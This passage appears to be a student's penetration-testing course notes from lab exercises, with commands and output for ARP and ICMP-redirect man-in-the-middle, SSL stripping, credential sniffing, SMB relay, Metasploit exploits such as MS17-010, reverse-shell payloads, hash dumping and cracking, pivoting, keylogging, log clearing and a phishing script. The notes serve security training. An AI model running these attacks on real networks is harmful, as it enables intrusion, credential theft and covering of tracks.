traffic and change the links in the web page. For example we change accounts.google.com to acccounts.google.com   The victim makes a DNS request For the domain acccounts.google.com   We intercept the request, forward the real DNS request and respond to the victim with a fake domain and the IP address.   Since the domain is different (its acccounts with 3 ‘c’) the browser will continue the communication via HTTP To know more about the bypass: \thttps://www.youtube.com/watch?v=Q3siIqS9LVA   MITMf tool  python mitmf.py -h   Some options:  -i = interface to listen on --spoof = this allows to redirect traffic using arp, icmp, dhcp or dns spoofing --arp = redirect traffic using ARP spoofing --dns = proxy/modify DNS queries --hsts = load plugin 'SSLstrip+' --gateway = specify the gateway IP --targets = specify hosts to poison   python mitmf.py -i eth0 --spoof --arp --dns --hsts --gateway 192.168.102.2 --targets 192.168.102.149   Lab Cain&amp;Abel   Audit workstation - 172.16.5.5   Network scope - 172.16.5.0/24 and 10.10.10.0/24   RDP gateway server - 10.10.10.20   There is only 1 server 172.16.5.0/24 - with firewall smb, netbios, vnc   myip - 172.16.5.152   audit - 172.16.5.5 Username: bcaseiro Password: letmein   Cain :      First enumerate live hosts then sniff in gateway with the two hosts to find more credentials    \tHTTP admin:et1@sR7!  FTP Credentials FTP Server IP Address \t Username \tbcaseiro Password    letmein  HTTP Credentials IP Address \t URL  Username admin\t Password et1@sR7!  RDP Connection RDP Client Version \t Encryption level \t4-medium german !Corinthians2012    VNC Connection VNC Server \t VNC 3DES Encrypt \ttimao   with cain&amp;abel:   we can sniff get hashes and send to cracker \tdictionary attack \tbruteforce attack (if we know the length is better) decode files such as RDP-FILE in this lab   with dictionary attack:  aline:soccer dba:gloves admin:monkey   Network tab &gt; Quick list &gt; add to quick list &gt; 172.16.5.10 (this ip has firewall, we cant access through rdp) alice:soccer (credentials we got earlier with MITM ) Registry  &gt; Software &gt; ORL &gt; WinVNC3 &gt; Password &gt; grab the hash Cain Tools &gt; VNC Password Decoder &gt; paste the hash = NBARocks   Network tab &gt; quick list &gt; add &gt; 172.16.5.10 &gt; alice:soccer &gt; services &gt; install abel This will give us additional features like windows shell, routing information, password hashes etc   Go back to quick list &gt; Abel &gt; Console     view firewalls rules   \tnetsh firewall show config = to review firewalls rules      this will enable Remote Desktop   \treg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f       check the port 3389 (its listening)   \tnetstat -an |findstr :3389      enable on the Windows Firewall   \tnetsh firewall add portopening TCP 3389 \"Remote Desktop\"      verify the firewall rules again to see if 3389 is able   \tnetsh firewall show config      At this point we can access the last machine 172.16.5.10 via RDP       OBS: we need to right click in cracker &gt; reset position of dictionary before executing    Lab Poison   my ip : 172.16.5.100   scope     172.16.5.0/24                  hosts                         ip       mac           netdiscover   172.16.5.1      00:50:56:a2:9b:1f                                                   172.16.5.10     00:50:56:a2:4f:f5                                                  172.16.5.5      00:50:56:a2:36:6e                                                    172.16.5.6      00:50:56:a2:ab:f6     172.16.5.10 = dns server - Simple DNS Plus - Windows   nslookup  &gt; server 172.16.5.10 Default server: 172.16.5.10 Address: 172.16.5.10#53 &gt; 172.16.5.5 5.5.16.172.in-addr.arpa name = wkst-techsupport.sportsfoo.com. 172.17 dig @172.16.5.10 -x 172.16.5.5 +nocookie \twe can do this to every IP, to see the name  \twkst-finance.sportsfoo.com. = 172.16.5.5 \twkst-techsupport.sportsfoo.com = 172.16.5.6 \tels-winser2003.sports.com = 172.16.5.10 \tftp.sportsfoo.com = 10.10.10.6 \tintranet.sportsfoo.com = 10.10.10.10       Knowning that there is a firewall in the gateway 172.16.5.1 we can image the network map draw      ps: too lazy to draw maps now    Full zone transfer records  dig @172.16.5.10 sportsfoo.com -t AXFR +nocookie  2 new hosts \t10.10.10.10 \t10.10.10.6   Identify the default Gateway:  traceroute 10.10.10.10 -m 5 sudo traceroute 10.10.10.10 -m 5 -T route = to show route table      as we can see, the gateway is 172.16.5.1 because the packet sent, pass through this IP before going to 10.10.10.10    Task5: Capture traffic between 172.16.5.5  -  172.16.5.1  arpspoof -i tap0 -t 172.16.5.5 -r 172.16.5.1 arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.5   now we can capture the packets  wireshark - tap0 &gt; after 5 minutes save the packet  driftnet -i tap0 = to capture images between hosts //I tried it didnt work   Task 8: Analyze the saves packets wireshark &gt; menu &gt; Statistics &gt; Protocl Hierarchy  \tgfreitas \tSilv@n@ \tHTTP //ps; my pcap didnt have HTTP packets  \tFilter String: http.request.method == \"GET\" \tHTTP \tSSL \thttp.request.method == \"POST\" \thttp.location == login_success.php \tsmb.file   \tbcaseiro:#MySecretPassword \tadmin:et1@sR7! \talmir \tCorinthians2012   Wireshark &gt; Export Objects &gt; HTTP \tto get files such as images etc   Wireshark &gt; Export Objects &gt; SMB \tin SMB packets we discover a share in 172.16.5.10\\finances \tlets mount   sudo apt-get install cifs-utils  mkdir /tmp/finance sudo mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance ls -l /tmp/finance  $ ls -l /tmp/finance                    total 5 drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-1a5afa2a drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-c0a010 drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-ed6dad4d drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fd7dbd5d drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fdbd9d0d drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fe3e5e6e -rwxr-xr-x 1 root root 662 Nov 17  2012 performance.doc -rwxr-xr-x 1 root root 374 Nov 17  2012 salaries.doc  mkdir /tmp/tech sudo mount -t cifs //172.16.5.10/technology /tmp/tech -o rw,vers=1.0,user=admin,password=et1@sR7!       use exploit/windows/smb/psexec admin:et1@sR7!       we get shell.    task12: Countermeasures           What protocol can be used on the intranet in order to avoid that credentials are transmitted in clear-text?  SSL            What protocl or tool cab be used as a replacement For the FTP service in use on the host?  SFTP            What protocol can be used to ensure that all traffic between the file server and any other host on the LAn are encrypted?  IPSEC            What countermeasure can be impemented in order to protect the network against ARP poisoning attakcs?  You can use static ARP entries        2 - version      1 - scan the network to find alive hosts   arp-scan -I eth1 172.16.5.0/24 or netdiscover -i eth1 or  nmap -PR -sn 172.16.5.*   172.16.5.1 172.16.5.5 172.16.5.6 172.16.5.10 172.16.5.101      2 - find the DNS server   nmap -sV -p 53 &lt;network&gt; \tin this case: 172.16.5.10 is the DNS server \t      3 - scan the DNS server to find new hosts   nslookup &gt; server &lt;DNS Server&gt; \tip u wanna check   dig @  -t AXFR +nocookie \t// here we can get all the ips and names related to that dns server      4 - find the default gateway we can send     traceroute &lt;some ip&gt; -m 5 -T           the packet needs to go through the default gateway in this case its 172.16.5.1           5 - draw a network map   need to learn that            6 - sniff packets in all the directions before doing that remember to add       echo 1 &gt; /proc/sys/net/ipv4/ip_forward   arpspoof -i &lt;interface&gt; -t 172.16.5.5 -r 172.16.5.1 arpspoof -i &lt;interface&gt; -t 172.16.5.1 -r 172.16.5.5   // open wireshark to get the traffic and save // driftnet -f &lt;pcap file&gt; or -i &lt;interface&gt; to show the images between the packets, didnt work when i tried      analyze the pcap files   http   ftp   SMB   // try to find credentials      mount the share after getting the credentials    mkdir /tmp/finance mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance ls -l /tmp/finance/      once we have 2 credentials, we can try to get a shell msfconsole use exploit/linux/samba/is_known_pipename show options    set SMBUser admin set SMBPass et1@sR7! set LHOST 172.16.5.101 set SMB::AlwaysEncrypt false show advanced      Countermeasures   List at least one countermeasure that your client could implement \\for some of the problems identified during the test.   What protocol can be used on the http://intranet.sportsfoo.com in order to avoid that credentials are transmitted in clear-text?     SSL  What protocol or tool can be used as a replacement \\for the FTP service in use on the host ftp.sportsfoo.com?     SFTP  What protocol can be used to ensure that all traffic between the file server and any other host on the LAN are encrypted?     IPSEC  What countermeasure can be implemented in order to protect the network against ARP Poisoning attacks?     You can use static ARP entries      arp only works on layers 2, that means that it cannot find IPs from other networks, only from the LAN       filter in wireshark to get credentials Filter String: http and ip.addr == 172.16.5.5 Filter String: http.request.method == “GET” Filter String: http.request.method == “POST” http ftp smb       login: admin    password: et1@sR7!              we can export object such as images wireshark &gt; export objects &gt; HTTP    Lab NBT-NS   Internal pentest 172.16.23.1/24      172.16.23.10 172.16.23.100 172.16.23.103 - domain 172.16.23.101   Nmap scan report For 172.16.23.100 Host is up (0.37s latency). Not shown: 45 closed tcp ports (reset) PORT      STATE SERVICE 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 445/tcp   open  microsoft-ds 49152/tcp open  unknown 49154/tcp open  unknown MAC Address: 00:50:56:A0:30:85 (VMware)  Nmap scan report For 172.16.23.101 Host is up (0.29s latency). Not shown: 45 closed tcp ports (reset) PORT      STATE SERVICE 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 445/tcp   open  microsoft-ds 49152/tcp open  unknown 49154/tcp open  unknown MAC Address: 00:50:56:A0:81:FA (VMware)  Nmap scan report For 172.16.23.103 Host is up (0.33s latency). Not shown: 45 filtered tcp ports (no-response) PORT      STATE SERVICE 53/tcp    open  domain 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 445/tcp   open  microsoft-ds 49154/tcp open  unknown MAC Address: 00:50:56:A0:56:16 (VMware)   (john㉿kali)-[/usr/share/responder/tools]                                                                       └─$ sudo python3 MultiRelay.py -t 172.16.23.100 -u ALL  dmanuel::ELS-CHILD:5E91834E3DEEA60200000000000000000000000000000000:B119F42F56D3FD8859B5C2996EC5E263B119A2AEB996497E:d14f4f5c58eb5e32   ┌──(john㉿kali)-[/usr/share/responder/logs] └─$ cat SMB-Relay-SMB-172.16.23.101.txt dmanuel::ELS-CHILD:B1215FBE5E8DB22500000000000000000000000000000000:31A86CB9B587ED72FF3FEC26F15FC3AE4690217B6FC5EEB5:093f6c50ac36ae79           use exploit/multi/script/web_delivery       set options   set payload windows/x64/meterpreter/reverse_tcp   copy the payload   paste in the MultiRelay shell   we should gain a meterpreter shell            another network found:   ipconfig   10.100.40.100   background            use post/windows/gather/arp_scanner   set session 1   set rhost 10.100.40.0/24       \t10.100.40.1 \t10.100.40.100 \t10.100.40.101 \t10.100.40.103 \t10.100.40.107 \t10.100.40.255           use post/multi/manage/autoroute   set session 1            use auxiliary/scanner/portscan/tcp   set rhost 10.100.40.107   set ports 1-1000            use auxiliary/scanner/smb/smb_ms17_010   set rhost 10.100.40.107   I tried all hosts, only 107 was vulnerable to ms17-010            use exploit/windows/smb/ms17_010_psexec   set options   set lhost 172.16.23.100    // (the first machine we got)   // because we dont have direct access          We have system access to the second network    meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM  meterpreter &gt; hashdump  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ELS_Admin:1000:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HomeGroupUser$:1003:aad3b435b51404eeaad3b435b51404ee:3477c42a01b6cbc3dcf563696f8d8745::: new_admin:1001:aad3b435b51404eeaad3b435b51404ee:15573ddeb75394946f9503daaff864f5:::   load kiwi  \tlsa_dump_sam  \tlsa_dump_secrets   Domain : WIN7-ACCOUNTING                                                                                           SysKey : 61b4cf081a8ba3373d2fb6255f8fa1a4                                                                          Local SID : S-1-5-21-3081729745-3944019156-515220582                                                                                                                                                                                  SAMKey : 71f54acee9461e7f12a7e6a3c0e25ce9  RID  : 000001f4 (500) User : Administrator   Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0  RID  : 000001f5 (501) User : Guest  RID  : 000003e8 (1000) User : ELS_Admin   Hash NTLM: 89551acff8895768e489bb3054af94fd  RID  : 000003e9 (1001) User : new_admin   Hash NTLM: 15573ddeb75394946f9503daaff864f5     lm  - 0: 3139695ec03b3d855395a52f1deb748d     ntlm- 0: 15573ddeb75394946f9503daaff864f5  RID  : 000003eb (1003) User : HomeGroupUser$   Hash NTLM: 3477c42a01b6cbc3dcf563696f8d8745   Secret  : DefaultPassword cur/text: P@ssw0rd123 old/text: a2@3L$-CHILDL0c@l    cracked:   ELS_admin 89551acff8895768e489bb3054af94fd:P@ssw0rd123      scan the machine   nmap -sV -T4 -p- &lt;ip&gt;      discover the SO   nmap -A -O &lt;ip&gt;      NTLM downgrade attack with Responder   \tresponder -I eth1 --lm      The hash is stored in the /usr/share/responder/logs folder.       Compile de Runas and Syssvc to x86   i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv  i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode      multirelay   \t./MultiRelay.py -t 172.16.5.10 -u ALL      responder again to get a shell \tresponder -I eth1 –lm       Get a meterpreter shell   msfconsole -q search web_delivery  set TARGET 3 //Regsvr32 set LHOST 172.16.5.101 set PAYLOAD windows/meterpreter/reverse_tcp exploit      copy the regsvr32 command and execute in the target machine      [+] - this new INEs browser lab is the worst, where dafk is the openvpn access? [+] - i want my money back lol       anyway, we should get a shell       discover new machines in the new network ipconfig // to show the network     run arp_scanner -r 10.100.40.0/24           add a new route within meterpreter   \trun autoroute -s 10.100.40.0/24 \tbackground      scan   \tuse auxiliary/scanner/portscan/tcp \tset options \t// port 80 is open      portfwd the port 80 to our port 1234   \tsessions -i 1 \tportfwd add -l 1234 -p 80 -r 10.100.40.107 \tportfwd list      scan the localhost in another terminal // actually is the port 80 of the target   \tnmap -sV -p 1234 localhost           search for badblue exploit  The 10.100.40.107 machine is not accessible from the Kali machine, so we cant use the reverse_tcp payload. This is an essential step \\for us to choose the correct payload. In this case, we have to use the bind_tcp payload to gain the meterpreter session.            run the exploit windows/http/badblue_passthru       \tset RHOSTS 10.100.40.107 \tset PAYLOAD windows/meterpreter/bind_tcp \texploit \tgetuid \tsysinfo      we should get a shell    Lab ICMP   myip 10.100.13.20           Your goals are:       Find the web administration panel   Identify the client machine   Steal some valid credentials \\for the web administration panel            Identify the network you can reach:       └─$ ip route show dev tap0 \t10.23.56.0/24 via 10.100.13.1  \t10.100.13.0/24 proto kernel scope link src 10.100.13.20    Identify the live hosts:  \tsudo nmap -sn -n 10.23.56.0/24 10.100.13.0/24 or  fping -a -g 10.100.13.0/24 2&gt;/dev/null  \t \t10.100.13.1 \t10.100.13.126 \t10.23.56.1 \t10.23.56.100       Identify the victim and the server:   nmap -sS -sV -n 10.23.56.100 10.100.13.126      Configure your machine to perform IP Masquerading   echo 1 &gt; /proc/sys/net/ipv4/ip_forward  iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE           Creating an ICMP Redirect Script            Creating and sending ICMP redirect packets       originalRouterIP='10.100.13.1' attackerIP='10.100.13.20' victimIP='10.100.13.126' serverIP='10.23.56.100'       We create an ICMP Redirect packet   ip=IP() ip.src=originalRouterIP ip.dst=victimIP icmpRedirect=ICMP() icmpRedirect.type=5 icmpRedirect.code=1 icmpRedirect.gw=attackerIP      The ICMP packet payload /should/ contain the original TCP SYN packet       sent from the victimIP   redirPayloadIP=IP() redirPayloadIP.src=victimIP redirPayloadIP.dst=serverIP fakeOriginalTCPSYN=TCP() fakeOriginalTCPSYN.flags=\"S\" fakeOriginalTCPSYN.dport=80 fakeOriginalTCPSYN.seq=444444444 fakeOriginalTCPSYN.sport=55555   while True:     send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN) # Press &lt;enter&gt;      The End    Exploitation   Vulnerability Assessment   This phase is aimed at building a list of the vulnerabilities present on target systems. Can be done manually or automatically with tools such as nessus Take note, if stealth is a necessity, vuln scanners are probably not the best idea.      Scanner perform their probes on: Daemons listening on TCP and UDP ports Configuration files of OS, software suites, network devices etc Windows registry entries      The purpose is to find vulnerabilities and misconfigurations            Some scanners: OpenVAS = http://www.openvas.org/ Nexpose = http://www.rapid7.com/products/nexpose/index.jsp GFI LAN Guard = http://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard Nessus = http://www.tenable.com/products/nessus            Nessus: its composed of two components: a client and a server Client to configure the scans, server to perform the scanning processes and report the results back to client Client component offers a web inferface to interact and configure your scans Server component performs the scans by sending probes to system and applications, collecting the responsed and matching them against its vulnerability database          The first step is determining if the target hosts are alive and which ports are open For every open port found, the vuln scan will send special probes to determine which application is running on them. For each detected service (aka daemon), the scanner queries its database looking For known vulnerabilities.    Low Hanging Fruits ( LHF )   Misconfigured servers Unimplemented or badly implemented ACLs Default or weak passwords Open SMB shares / Null sessions Broadcast Requests Vulnerabilities related to public exploits   Weak Passwords   Ncrack  http://nmap.org/ncrack/  ncrack 10.10.10.0/24 - Uses the entire network, from 10.10.10.0 to 10.10.10.255 ncrack add.els.com - Uses the IP address of the domain ncrack 10.10.1,2.1-200 - Send probes to all ip address within the range 1-200 in the subnets 10.10.1 and 10.10.2 ncrack 10.10.10.56 - Send probes only to the 10.10.10.56 IP address   per-host specification:  &lt;service://target:port&gt; ncrack telnet://10.10.10.130:25 ncrack ssh://10.10.10.130 // if the service is in default port, we dont need to add here ncrack ssh://10.10.10.130:120 ncrack ssh://10.10.10.130 telnet://10.10.10.60:218 // verifying 2 services ncrack 10.10.10.10,15 -p ssh:50,telnet  // using -p = parameter  /usr/share/ncrack = list of common usernames and passwords -U = username wordlist // -P = password wordlist -u = fixed usernames // -p = fixed passwords // like hydra -v = verbosity // -d[0-10] = debugging level -f = exit once it finds valid credentials --resume &lt;path&gt; = to continue a previosly saved sessions       can be used with nmap scan with nmap first export the result -o [ N/X/L ] feed ncrack with Nmap results with the options -i [ N/X/L ]    Medusa  https://github.com/jmk-foofus/medusa   -h &lt;target hostname or ip&gt; -H &lt;file&gt; = file containing target hostanames or IP addresses -u &lt;target&gt; = fixed username -U &lt;file&gt; = username wordlist -p &lt;target&gt; = fixed password  -P &lt;file&gt; = password wordlist -d = to show availables modules (service that Medusa can target) \t/usr/lib/medusa/modules -q = display the module usage information -M = module  example:  \tmedusa -M telnet -q \tmedusa -h 192.168.102.149 -M telnet -U username.lst -P password.lst    Patator  https://github.com/lanjelot/patator manual = patator.py &gt; USAGE section   example:  patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'  user=root &gt; fixed username to test password=FILE0 &gt; its placeholder, FILE means we want to use a file, wordlist 0 its used to match the corresponding wordlist (0=passwords.txt)  indicate what order to iterate over all the wordlists.  We can have additional placeholders (FILE0, FILE1) Patator uses the first entry in FILE0 and iterates through all the entries in FILE1 Then it takes the second entry in FILE0 and iterates through all the words contained in FILE1 etc -x specify what to do upon receiving the expected result   EyeWitness  https://github.com/ChrisTruncer/EyeWitness   python EyeWitness.py --headless --prepend-https -f &lt;urls file&gt;  when the scan is complete it will generate an HTML report --active-scan = actively attempt to log into any and all devices found using known default credentials however, can result in account lockouts and will likely generate IDS or HIDS alerts.   Rsmangler  https://digi.ninja/projects/rsmangler.php      can be used to help us generate targeted wordlists we can use For our dictionary attacks   cat words.txt | rsmangler --file - &gt; words_new.txt      words here would be key words relative to that company For example, the word_new it will be generated a sort of variations of theses words. 3 words can generate 7000 results.    CeWL  https://digi.ninja/projects/cewl.php   It scrapes a target organizations website For keywords, and in turn, will generate a list of words we can use For our wordlist.   cewl -m 8 http://www.google \t// -m 8 = create a list of words with minimum of 8 characters      we could then, further improve our wordlist using Rsmangler to create permutations of the keywords identified with cewl.    Mentalist  https://github.com/sc0tfree/mentalist https://github.com/sc0tfree/mentalist/wiki      its GUI  can generate rules files that can be used with hashcat and john    Exploitation   Windows Authentication Weaknesses  LM/NTLMv1   challenge/response protocol Type1 (negotiation), Type 2 (challenge) and Type 3 (Authentication) 1. The client sends a request For authentication 2. Server sends an 8-byte challenge (random value) 3. Client encrypts the challenge using the password hash and send it back as response   The generated hash (16-bytes long) is padded with 5 null bytes making it a 21 bytes string The 21 bytes string is split in 3 blocks, 7bytes long each + 1 parity byte. The responde will be then 24 bytes long.          In the attack scenario we impersonate the server, and then the challenge is chosen by us. moreover: http://davenport.sourceforge.net/ntlm.html#theType3Message            Weaknesses:   No diffusion, meaning that each part of DES output is not linked to the previous one. This allow attacks on the three blocks individually. DES is an old algorithm with intrinsic weaknesses. The third DES key block is much weaker than the others, since it has 5 null bytes For padding.            How exploit this weaknesses?   Our goal is to capture the client responde (step 3 of the protocol)            There is 2 methods:   Force the client (target) to start a connection to us (fake server)   Use MITM techniques in order to sniff the client response       \tmetasploit \tuse auxiliary/server/capture/smb \tset challenge = 1122334455667788 \tset johnpwfile = hashpwd //tell metasploit to save the hashes to a file and formatted to work with john. \trun      Since we control the challenge (that acts as a salt in the hash), we can use rainbow tables. There is tables built For the 8 byte server challenge (1122334455667788)       Force the client to start a connection   the easiest way is through SMB authentication   we can embed a UNC path (Universal Naming Convention) (\\SERVER_IP\\SHARE) into an email message or a web page.   HTML tag:  \t&lt;img src=\"\\\\192.168.102.147\\ADMIN$\"&gt;      If someone open the page and attempts a connection to our listener we should get the hashes everytime they click its the same hash, because the challenge is fixed (11222334455667788) useful tip: if the password length is less or equal 7 characters, the last 8 bytes of NTLM response are always the same: 2f85252cc731bb25       With hashes in hand   Now we can crack the hashes     john --format=netlm hashpwd           Rainbow tables  // to quicken the cracking process we can use rainbow tables rcracki_mt:  \thttps://github.com/foreni-packages/rcracki_mt rainbow tables: \thttp://project-rainbowcrack.com/table.htm \thttp://ophcrack.sourceforge.net/tables.php      copy the first 8-bytes of the LMHASH (16 characters)    rcracki_mt -h 1234567812345678 -t 4 *.rti -h = specify the 8byte hash -t = threads *.rti = the path of the downloaded rainbow tables      we should have a half password now we brute-force the remainder of the hash    metasploit-framework/tools/password &gt; halflm_second.rb   ruby halflm_second.rb -n &lt;complete hash&gt; -p &lt;half discovered password&gt;      we have the full password but its all uppercase, which may not be accurate so we will use a perl script in the john folder : netntlm.pl    perl netntlm.pl -file &lt;hashpwd file&gt; -seed &lt;full password&gt;      we can also use the netntlm.pl to find the uppercase password with the half portion (instead of halflm_second.rb) and then use it again to find the case-sensitive one    perl netntlm.pl -file &lt;hashpwd file&gt; -seed &lt;half password&gt;   NTLMv2  the difference with the old NTLMv1 is that the type 3 message is generated in a differente way. ``` HMAC-MD5(NTLM Hash, &lt;USERNAME, server&gt;)  HMAC-MD5(NTLMv2 Hash, &lt;BLOB, Server_challenge&gt;)  Server receives hash + blob blob contains a client challenge and the timestamp ```           blob:   blob signature (4 bytes)   reserved (4 bytes)   timestamp (8 bytes)   client nonce (random 8 bytes)   unknown (4 bytes)   target information (variable length)   unknown (4 bytes)            NTLMv2 changes:   dues to timestamp and the client response, the response changes every time   impossible to create rainbow tables to gather the NT hash or the password from the NTLMv2 response   dictionary does not make sense as the key is a hash   the only possible attack is by brute-forcing the HMAC key   the NTLMv2 hash is bound to a particular server and particular username so its not reusable            moreover:   http://davenport.sourceforge.net/ntlm.html#ntlmVersion2   http://davenport.sourceforge.net/ntlm.html#theNtlmv2Response       SMB Relay attacks  allows the attacker to re-use authentication attempts in order to gain access to a system in the network      SMB Relay on NTLMv1   \tmsfconsole \tuse exploit/windows/smb/smb_relay \tset options \trun \t   // wait to someone connect to our machine // this can happen with: backups, patch manegement, updates and so on // we will be able to obtain a meterpreter session // btw, this only works if the target machines has the **network security: LAN Manager authentication level** set to **Send Lm &amp; NTLM responses**.   SMB Relay on NTLMv2  metasploit smb_relay works well too, but lets use impacket https://github.com/coresecurity/impacket   create the payload:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o smbexp.exe   create the handler:  exploit/multi/handler set options accordingly with the payload   config smbrelayx:  smbrelayx.py -h &lt;target ip&gt; -e &lt;msfvenom exe payload file path&gt;      we should gain a shell in meterpreter    EternalBlue (MS17-010)  detecting a vuln host:  auxiliary/scanner/smb/smb_ms17_010   exploit module:  exploit/windows/smb/ms17_010_eternalblue   Client-Side Exploitation     requires user interaction   exploits the mozilla pdf.js PDF file viewer  \texploit/multi/browser/firefox_pdfjs_privilege_escalation \tset options \t// srvhost = our ip \t// payload= firefox/shell_reverse_tcp      now we need to lure the victim to click on the link generated by the metasploit we should get a meterpreter shell    another module:  exploit/multi/browser/adobe_flash_hacking_team_uaf   Remove Exploitation     does not require use interaction (open link, email etc)   \texploit/windows/smb/ms08_067_netapi \tset options      if the machine is vulnerable and the exploit succeds, we should get a new shell    NTLMv2      Metasploit  msfupdate  service postgresql start msfconsole   search  type:exploit platform:windows author:HDM search cve:2015   execute -f cmd.exe -i H  //stealth   search -f secret.*  // in meterpreter shell   run post/windows/gather   ps = show processes migrate = need to specify the PID of the process run post/windows/manage/migrate = migrate automatically to notepad.exe   keystroke capture  keyscan_start keyscan_dump keyscan_stop      clearev = clear traces/logs etc    Lab VA  myip: 172.16.5.50 scope: 10.50.97.0/24   fping -a -g 10.50.97.0/24 2&gt;/dev/null &gt; hostsup  10.50.97.1 10.50.97.5 - winxp - eternal blue 10.50.97.8 - server 2003 - eternal blue 10.50.97.14 - server 2003 - eternal blue 10.50.97.21       You can start Nessus Scanner by typing /bin/systemctl start nessusd.service   Then go to https://kali:8834/ to configure your scanner   search ms08-067-netapi    Administrator:500:6df60586675b97c51f6252914a7633d7:fc5399dc481550f5442d1585e10c0345::: elsuser:1005:aad3b435b51404eeaad3b435b51404ee:04820cccb2ea44ad7e60f97961fba7e1::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d::: netadmin:1004:a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874::: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::    netadmin:CONGRAT0905   Username    Domain     LM                            NTLM                          SHA1 --------    ------     --                            ----                          ---- ELS-WINXP$  WORKGROUP  aad3b435b51404eeaad3b435b514  31d6cfe0d16ae931b73c59d7e0c0  da39a3ee5e6b4b0d3255bfef95601                        04ee                          89c0                          890afd80709    http://www.darkoperator.com/blog/2011/12/16/psexec-scanner-auxiliary-module.html \t// tried to use, without success \t//seems old 2011, anyway I did one by one instead   resume: \tone machine was winxp, so we got access with ms08-067-netapi  \tthen we grabbed the hashes and use psexec to enter in other 2 machines \tthe last one was a ftp server, we searched the version in metasploit and got access too.   ms08-067-netapi   //used For 10.50.97.5   exploit(windows/smb/ms17_010_psexec   //used For 10.50.97.8,14   exploit(freebsd/ftp/proftp_telnet_iac) &gt; run   //used For 10.50.97.21 PORT   STATE SERVICE VERSION 21/tcp open  ftp     ProFTPD 1.3.2a   Lab Nessus  myip: 192.168.78.100 network: 192.168.78.01/24 dmz: 10.100.0.0/24   10.100.0.1 10.100.0.80 192.168.78.1 192.168.78.10 192.168.78.20 192.168.78.18   nmap -sn -oG - 192.168.78.* | awk '/Up$/ {print $2}'   192.168.78.10 = xp \tms08_067_netapi    \tgot the hashes: \tAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c::: \teLSAdmin:1003:67fb9805a02c8249aad3b435b51404ee:b0c6522c478a0886fb92544d16c75679::: \tGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: \tHelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d::: \tnetadmin:1004:6d4c8d28110c649d1f6252914a7633d7:1f1c7bfdba645b14c37dde4465b59542::: \tSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::    192.168.78.18 \tms17-010-psexec \tmeterpreter shell   //First scan nessus in GUI //Then we can import and analyses via metasploit   service postgresql start  msfdb init   load nessus nessus_connect user:password@localhost nessus_scan_list nessus_report_vulns &lt;id&gt; nessus_report_hosts &lt;id&gt; nessus_db_import &lt;id&gt;    https://github.com/darkoperator/Metasploit-Plugins/blob/master/pentest.rb load pentest vuln_exploit      we can then create a nessus scan with credentials to get better results: Moreover, set the following SSH credentials:        Username: netadmin     Password: netpwd   Lab Client Side   myip: 192.168.70.45/24   scope:  \t10.10.50.0/23 \t10.10.51.0        user@foocompany.com     adam@foocompany.com     mary@foocompany.com   We should send an email to user, and exploit via multi/browser/java_jre17_exec. because we do not have direct access to the 10.10 network.   Tried to do with thunderbird, no success. I will try with Icedove later.   Then we should  meterpreter session:   \trun autoroute -s 10.10.51.0/24 \tbackground auxiliary/server/socks4a       set options   remember, it is the same port as the file: /etc/proxychains.conf      now we can nmap to target, because proxychains is redirecting through the first shell machine to the meterpreter session.    search ProFTPD 1.3.2a  \texploit/freebsd/ftp/proftp_telnet_iac \twe should have access to the server   ip addr msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=4444 -f exe &gt; backdoor.exe file backdoor.exe   msfconsole -q   use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.15.4 set LPORT 4444 exploit      python &gt; send_email.py    import smtplib from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.base import MIMEBase from email import encoders fromaddr = \"attacker@fake.net\" toaddr = \"bob@ine.local\"   # instance of MIMEMultipart msg = MIMEMultipart() # storing the senders email address   msg['From'] = fromaddr # storing the receivers email address  